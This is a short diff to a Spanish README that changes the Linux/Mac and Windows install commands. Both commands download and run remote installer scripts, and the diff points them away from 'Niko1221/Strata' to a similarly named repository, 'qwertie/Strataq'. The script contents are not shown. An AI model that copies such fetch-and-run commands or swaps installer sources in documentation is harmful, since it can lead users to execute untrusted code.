@@ -115,13 +115,13 @@ Instala la aplicación, elige un modelo y empieza a chatear. Hay un instalador p
 **Linux / Mac**
 
 ```sh
-curl -fsSL https://github.com/Niko1221/Strata/releases/latest/download/install.sh -o install.sh && sh install.sh
+curl -fsSL https://github.com/qwertie/Strataq/releases/latest/download/install.sh -o install.sh && sh install.sh
 ```
 
 **Windows PowerShell**
 
 ```powershell
-irm https://github.com/Niko1221/Strata/releases/latest/download/install.ps1 | iex
+irm https://github.com/qwertie/Strataq/releases/latest/download/install.ps1 | iex
 ```
 
 En Windows, abre una terminal nueva después. Luego:
